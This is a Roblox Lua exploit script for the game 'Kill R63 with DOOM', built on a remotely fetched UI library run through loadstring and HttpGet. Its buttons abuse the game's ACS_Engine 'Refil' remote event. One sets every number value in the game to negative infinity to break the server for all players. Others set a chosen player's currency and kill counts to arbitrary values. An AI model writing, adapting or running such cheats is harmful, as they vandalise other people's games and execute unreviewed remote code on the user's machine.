local SolarisLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/sol"))()
local playertable = {}

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
   if v~=game.Players.LocalPlayer then
       playertable[#playertable+1] = v.Name
   end
end

game.Players.PlayerAdded:Connect(function(player)
   if player~=game.Players.LocalPlayer then
       playertable[#playertable+1] = player.Name
   end
end)

game.Players.PlayerRemoving:Connect(function(player)
   if player~=game.Players.LocalPlayer then
       playertable[#playertable-1] = player.Name
   end
end)

local win = SolarisLib:New({
  Name = "Kill R63 with DOOM made by ren !#2925",
  FolderToSave = "SolarisLibStuff"
})

local tab = win:Tab("ALL THE GOOD SHIT")

local sec = tab:Section("FUCK OTHER PLAYERS")

local selectedPlayer

local dropdown = sec:Dropdown("Select player", playertable,"","Dropdown", function(t)
  print(t)
  selectedPlayer = t
end)

sec:Button("fuck the server", function()
for i,v in pairs(game:GetDescendants()) do
if v:IsA("NumberValue") or v:IsA("IntValue") then
game:GetService("ReplicatedStorage").ACS_Engine.Events.Refil:FireServer(v, -math.huge)
end
end
end)

sec:Button("Reset player list", function()
dropdown:Refresh(playertable, true)
dropdown:Set(selectedPlayer)
end)

sec:Textbox("Currency amount", false, function(Currency)
    game:GetService("ReplicatedStorage").ACS_Engine.Events.Refil:FireServer(game.Players[selectedPlayer].leaderstats.Currency, Currency)
end)

sec:Textbox("Kills amount", false, function(Kills)
      game:GetService("ReplicatedStorage").ACS_Engine.Events.Refil:FireServer(game.Players[selectedPlayer].leaderstats.Kills, Kills)
end)
